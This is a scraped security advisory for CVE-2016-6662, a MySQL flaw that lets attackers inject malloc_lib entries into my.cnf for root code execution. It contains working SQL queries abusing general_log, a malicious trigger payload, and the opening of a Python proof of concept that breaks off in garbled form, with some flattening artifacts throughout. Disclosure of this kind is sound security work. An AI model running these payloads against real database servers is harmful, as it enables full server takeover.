{
    "text": "vul_name : MySQL <= 5.7/5.6/5.5 Remote Root Code Execution / Privilege Escalation ( 0day )  ， vul_cve : CVE-2016-6662 ， vul_poc : = ， - Discovered by : Dawid Golunski ， - dawid ( at ) legalhackers.com ， - CVE-2016-6662 ， - Release date : 12.09.2016 ， - Severity : Critical ， I. VULNERABILITY ， MySQL <= 5.7.15 Remote Root Code Execution / Privilege Escalation ( 0day )  ， 5.6.33 ， 5.5.52 ， MySQL clones are also affected , including :  ， MariaDB ， PerconaDB ， II. BACKGROUND ， \"MySQL is the world's most popular open source database. ， Whether you are a fast growing web property , technology ISV or large ， enterprise , MySQL can cost-effectively help you deliver high performance ,  ， scalable database applications.\" ， \"Many of the world's largest and fastest-growing organizations including ， Facebook , Google , Adobe , Alcatel Lucent and Zappos rely on MySQL to save time ， and money powering their high-volume Web sites , business-critical systems and ， packaged software.\" ， III. INTRODUCTION ， An independent research has revealed multiple severe MySQL vulnerabilities. ， This advisory focuses on a critical vulnerability with a CVEID of CVE-2016-6662 ， which can allow attackers to ( remotely ) inject malicious settings into MySQL ， configuration files ( my.cnf ) leading to critical consequences. ， The vulnerability affects all MySQL servers in default configuration in all ， version branches ( 5.7 , 5.6 , and 5.5 ) including the latest versions , and could ， be exploited by both local and remote attackers. ， Both the authenticated access to MySQL database ( via network connection or web ， interfaces such as phpMyAdmin ) and SQL Injection could be used as exploitation ， vectors. ， As SQL Injection attacks are one of the most common issues in web applications ,  ， the CVE-2016-6662 vulnerabilty could put web applications at a critical risk in ， case of a successful SQL Injection attack. ， A successful exploitation could allow attackers to execute arbitrary code with ， root privileges which would then allow them to fully compromise the server on ， which an affected version of MySQL is running. ， Official patches for the vulnerability are not available at this time for Oracle ， MySQL server. ， The vulnerability can be exploited even if security modules SELinux and AppArmor ， are installed with default active policies for MySQL service on major Linux ， distributions. ， This advisory provides a Proof-Of-Concept MySQL exploit which demonstrates how ， Remote Root Code Execution could be achieved by attackers. ， IV. DESCRIPTION ， The default MySQL package comes with a mysqld_safe script which is used by many ， default installations/packages of MySQL as a wrapper to start the MySQL service ， process which can observed , for example , in case of the following fully-updated ， Debian system :  ， root @ debian :  ~  # lsb_release -a ， No LSB modules are available. ， Distributor ID : Debian ， Description : Debian GNU/Linux 8.5 ( jessie )  ， Release : 8.5 ， Codename : jessie ， root @ debian :  ~  # dpkg -l | grep -i mysql-server ， ii mysql-server 5.5.50-0+deb8u1 ， ii mysql-server-5.5 5.5.50-0+deb8u1 ， ii mysql-server-core-5.5 5.5.50-0+deb8u1 ， After starting MySQL ( installed from packages provided in the default Debian repositories ) by running ， root @ debian :  ~  # service mysql start ， or , alternatively :  ， root @ debian :  ~  # /etc/init.d/mysql start ， The MySQL server process tree looks as follows :  ， root 14967 0.0 0.1 4340 1588 ? S 06 : 41 0 : 00 /bin/sh /usr/bin/mysqld_safe ， mysql 15314 1.2 4.7 558160 47736 ? Sl 06 : 41 0 : 00 /usr/sbin/mysqld -basedir=/usr -datadir=/var/lib/mysql -plugin-dir=/usr/lib/mysql/plugin -user=mysql -log-error=/var/log/mysql/error.log -pid-file=/var/run/mysqld/mysqld.pid -socket=/var/run/mysqld/mysqld.sock -port=3306 ， As can be seen , the mysqld_safe wrapper script is executed as root , whereas the ， main mysqld process drops its privileges to mysql user. ， The wrapper script has the following function :  ， - [ /usr/bin/mysqld_safe ] - ，  [ . ]  ，  # set_malloc_lib LIB ，  # - If LIB is empty , do nothing and return ，  # - If LIB is 'tcmalloc' , look for tcmalloc shared library in /usr/lib ，  # then pkglibdir. tcmalloc is part of the Google perftools project. ，  # - If LIB is an absolute path , assume it is a malloc shared library ，  # Put LIB in mysqld_ld_preload , which will be added to LD_PRELOAD when ，  # running mysqld. See ld.so for details. ， set_malloc_lib (  ) { ， malloc_lib=\" $ 1\" ， pkglibdir=`get_mysql_config -variable=pkglibdir` ， malloc_lib= ，  # This list is kept intentionally simple. Simply set -malloc-lib ，  # to a full path if another location is desired. ， tmp=\" $ libdir/libtcmalloc $ flavor.so\" ，  # log_notice \"DEBUG : Checking for malloc lib ' $ tmp'\" ，  [ -r \" $ tmp\" ]  | continue ， malloc_lib=\" $ tmp\" ， done ， done ，  [ . ]  ， - [ eof ] - ， which can be used to preload a shared library before starting the server. ， The library can be set with the following parameter :  ， -malloc-lib=LIB ， This parameter can also be specified within a mysql config file ( my.cnf )  ， in a ' [ mysqld ] ' or ' [ mysqld_safe ] ' section. ， If an attacker managed to inject a path to their malicious library within the ， config , they would be able to preload an arbitrary library and thus execute ， arbitrary code with root privileges when MySQL service is restarted ( manually ,  ， via a system update , package update , system reboot etc. )  ， In 2003 a vulnerability was disclosed in MySQL versions before 3.23.55 that ， allowed users to create mysql config files with a simple statement :  ， SELECT * INFO OUTFILE '/var/lib/mysql/my.cnf' ， The issue was fixed by refusing to load config files with world-writable ， permissions as these are the default permissions applied to files created ， by OUTFILE query. ， As an additional protection , OUTFILE/DUMPFILE statements are prohibited from ， overwrite existing files. ， This protects existing configuration files. ， The old vulnerability has been considered fixed ever since the MySQL 3.23.55 ， was released in 2003 , and writing to configuration files has been considered ， impossible. ， However , the V. PROOF OF CONCEPT section below will show that it is possible to ， successfully bypass current restrictions by abusing MySQL logging functions ，  ( available in every MySQL install by default ) to achieve the following :  ， 1 ) Inject malicious configuration into existing MySQL configuration files on ， systems with weak/improper permissions ( configs owned by/writable by mysql user ) . ， 2 ) Create new configuration files within a MySQL data directory ( writable ， by MySQL by default ) on _default_ MySQL installs without the need to rely on ， improper config permisions. ， 3 ) Attackers with only SELECT/FILE permissions can gain access to logging ， functions ( normally only available to MySQL admin users ) on all of the ， _default_ MySQL installations and thus be in position to add/modify MySQL ， config files. ， V. PROOF OF CONCEPT ， 1 ) Inject malicious configuration into existing MySQL configuration files on ， systems with weak/improper permissions ( configs owned by/writable by mysql user ) . ， MySQL configuration files are loaded from all supported locations and processed ， one by one when mysqld_safe script is executed. ， Exact config locations depend on MySQL version. ， For example , as described on :  ， /etc/my.cnf Global options ， /etc/mysql/my.cnf Global options ， SYSCONFDIR/my.cnf Global options ，  $ MYSQL_HOME/my.cnf Server-specific options ， defaults-extra-file The file specified with -defaults-extra-file=file_name , if any ，  ~ /.my.cnf User-specific options ， There is a common misconception that mysql config files should be owned by mysql ， user for the server to work properly. ， Many installation guides , or even security guides often wrongly advise users ， to set the ownership of mysql config files/directories such as /etc/mysql ， or /etc/my.cnf to mysql user. ， For example :  ， says :  ， \"Lock down permissions on config file ( s )  ， chown mysql /etc/my.cnf ， chmod 600 /etc/my.cnf\" ， Whereas the article at :  ， mentions :  ， \"You should also protect the global option file , /etc/my.cnf , if it exists. ， The mysql user should own it and have read/write access to it , but other users ， need only read access :  ， shell> chown mysql /etc/my.cnf\" ， Moreover , there are also MySQL recipes for installation automatation software ， such as Chef that also provide users with vulnerable permissions on my.cnf ， config files. ， If any of the MySQL config files is owned by mysql user , an attacker could ， append malicious config entries to it as follows :  ， root @ debian :  ~ / # ls -l /etc/my.cnf ， -rw-r-r- 1 mysql mysql 72 Jul 28 17 : 20 /etc/my.cnf ， root @ debian :  ~ / # cat /etc/my.cnf ，  [ mysqld ]  ， key_buffer = 16M ， max_allowed_packet = 16M ， Attacker could run the following SQL queries :  ， mysql> set global general_log_file = '/etc/my.cnf' ;  ， mysql> set global general_log = on ;  ， mysql> select ' ， '> ， '> ; injected config entry ， '> ， '> [ mysqld ]  ， '> malloc_lib=/tmp/mysql_exploit_lib.so ， '> ， '> [ separator ]  ， '> ， '> ' ;  ， 1 row in set ( 0.00 sec )  ， mysql> set global general_log = off ;  ， The resulting config would then have the following part appended :  ， root @ debian :  ~ / # cat /etc/my.cnf ，  [ mysqld ]  ， key_buffer = 16M ， max_allowed_packet = 16M ， /usr/sbin/mysqld , Version : 5.5.50-0+deb8u1 ( Debian ) . started with :  ， Tcp port : 3306 Unix socket : /var/run/mysqld/mysqld.sock ， Time Id Command Argument ， 160728 17 : 25 : 14 40 Query select ' ，  ; injected config entry ，  [ mysqld ]  ， malloc_lib=/tmp/mysql_exploit_lib.so ，  [ separator ]  ， ' ， 160728 17 : 25 : 15 40 Query set global general_log = off ， This config contains some redundant information that would normally cause MySQL ， to fail to startup during a restart due to parsing issues. ， However , the important part is that the config now contains the section :  ，  [ mysqld ]  ， malloc_lib=/tmp/mysql_exploit_lib.so ， mysqld_safe will read the shared library path correctly and add it to ， the LD_PRELOAD environment variable before the startup of mysqld daemon. ， The preloaded library can then hook the libc fopen (  ) calls and clean up ， the config before it is ever processed by mysqld daemon in order for it ， to start up successfully. ， 2 ) Create new configuration files within a MySQL data directory ( writable ， by MySQL by default ) on _default_ MySQL installs without the need to rely on ， improper config permisions. ， Analysis of the mysqld_safe script has shown that in addition to the ， config locations provided above , mysqld_safe also loads the configuration file ， from the mysql data directory ( /var/lib/mysql/my.cnf ) by default as can be ， seen below :  ， - [ /usr/bin/mysqld_safe ] - ，  [ . ]  ，  # Try where the binary installs put it ， then ， DATADIR= $ MY_BASEDIR_VERSION/data ， then ， defaults=\"-defaults-extra-file= $ DATADIR/my.cnf\" ， fi ，  [ . ]  ， - [ eof ] - ， on MySQL versions in branches 5.5 and 5.6. ， The datadir location for my.cnf has only been removed from MySQL starting ， from 5.7 branch however in many configurations it will still load config ， from :  ， /var/lib/mysql/.my.cnf ， The data directory /var/lib/mysql is ( obviously ) writable by mysql user on ， every install :  ， root @ debian :  ~  # ls -ld /var/lib/mysql/ ， drwx- 4 mysql mysql 4096 Jul 28 06 : 41 /var/lib/mysql/ ， Therefore , if no mysql-owned configs are available on the system , an attacker ， could still be able to exploit the vulnerability by creating a config at the ， following locations :  ， /var/lib/mysql/my.cnf ， /var/lib/mysql/.my.cnf ， As mentioned , using FILE permission to create such a file with the SQL statement :  ， SELECT 'malicious config entry' INTO OUTFILE '/var/lib/mysql/my.cnf' ， would not work , as MySQL creates files with rw permissions for the world :  ， -rw-rw-rw- 1 mysql mysql 4 Jul 28 07 : 46 /var/lib/mysql/my.cnf ， and MySQL would prevent such world-writable config from being loaded at startup. ， Attackers could bypass this however by using these logging SQL statements :  ， mysql> set global general_log_file = '/var/lib/mysql/my.cnf' ;  ， mysql> set global general_log = on ;  ， mysql> select ' ， '> ， '> ; injected config entry ， '> ， '> [ mysqld ]  ， '> malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so ， '> ， '> [ separator ]  ， '> ， '> ' ;  ， 1 row in set ( 0.00 sec )  ， mysql> set global general_log = off ;  ， The queries will create the my.cnf file with the necessary permissions ，  ( without o-w bit ) for it to be parsed by the MySQL daemon :  ，  # ls -l /var/lib/mysql/my.cnf ， -rw-rw- 1 mysql mysql 352 Jul 28 17 : 48 /var/lib/mysql/my.cnf ， The file will have the following contents :  ，  # cat /var/lib/mysql/my.cnf ， /usr/sbin/mysqld , Version : 5.5.50-0+deb8u1 ( Debian ) . started with :  ， Tcp port : 3306 Unix socket : /var/run/mysqld/mysqld.sock ， Time Id Command Argument ， 160728 17 : 48 : 22 43 Query select ' ，  ; injected config entry ，  [ mysqld ]  ， malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so ，  [ separator ]  ， ' ， 160728 17 : 48 : 23 43 Query set global general_log = off ， One problem will remain however. MySQL will refuse files that do not start with ， a valid [ section ] header with the message :  ， error : Found option without preceding group in config file : /var/lib/mysql/my.cnf at line : 1 ， Fatal error in defaults handling. Program aborted ， Further testing has however proved that it is possible to bypass this security ， restriction as well but these will not be included in this advisory for the ， time being. ， It is worth to note that attackers could use one of the other vulnerabilities discovered ， by the author of this advisory which has been assigned a CVEID of CVE-2016-6662 and is ， pending disclosure. The undisclosed vulnerability makes it easy for certain attackers to ， create /var/lib/mysql/my.cnf file with arbitrary contents without the FILE privilege ， requirement. ， 3 ) Attackers with only SELECT/FILE permissions can gain access to logging functions ，  ( normally only available to MySQL admin users ) on all of the _default_ MySQL ， installations and thus be in position to add/modify MySQL config files. ， If attackers do not have administrative rights required to access logging settings ， and only have standard user privileges with the addition of FILE privilege then ， they could still gain the ability to write to / modify configuration files. ， This could be achieved by writing a malicious trigger payload :  ， CREATE DEFINER=`root` @ `localhost` TRIGGER appendToConf ， AFTER INSERT ， ON `active_table` FOR EACH ROW ， BEGIN ， DECLARE void varchar ( 550 )  ;  ， set global general_log_file='/var/lib/mysql/my.cnf' ;  ， set global general_log = on ;  ， select \" ，  [ mysqld ]  ， malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so' ， \" INTO void ;  ， set global general_log = off ;  ， END ;  ， into a trigger file of an actively used table ( 'active_table' ) with the ， use of a statement similar to :  ， SELECT '.trigger_code.' INTO DUMPFILE /var/lib/mysql/activedb/active_table.TRG' ， Such trigger will be loaded when tables get flushed. From this point on ， whenever an INSERT statement is invoked on the table , e.g :  ， INSERT INTO `active_table` VALUES ( 'xyz' )  ;  ， The trigger's code will be executed with mysql root user privileges ( see ， 'definer' above ) and will thus let attacker to modify the general_log settings ， despite the lack of administrative privileges on their standard account. ， VI. PROOF OF CONCEPT - 0day 0ldSQL_MySQL_RCE_exploit.py exploit ， - [ 0ldSQL_MySQL_RCE_exploit.py ] - ，  #  ! /usr/bin/python ，  # This is a limited version of the PoC exploit. It only allows appending to ，  # existing mysql config files with weak permissions. See V ) 1 ) section of ，  # the advisory for details on this vector. ，  # Full PoC will be released at a later date , and will show how attackers could ，  # exploit the vulnerability on default installations of MySQL on systems with no ，  # writable my.cnf config files available. ，  # The upcoming advisory CVE-2016-6663 will also make the exploitation trivial ，  # for certain low-privileged attackers that do not have FILE privilege. ，  # See full advisory for details :  ，  # Stay tuned ;  )  ， intro = \" ， 0ldSQL_MySQL_RCE_exploit.py ( ver. 1.0 )  ，  ( CVE-2016-6662 ) MySQL Remote Root Code Execution / Privesc PoC Exploit ， For testing purposes only. Do no harm. ， Discovered/Coded by :  ， Dawid Golunski ， \" ， print \" [ + ] \" + str + \"\\n\" ， print \" [  !  ] \" + str + \"\\n\"",
    "time": "2016.09.12"
}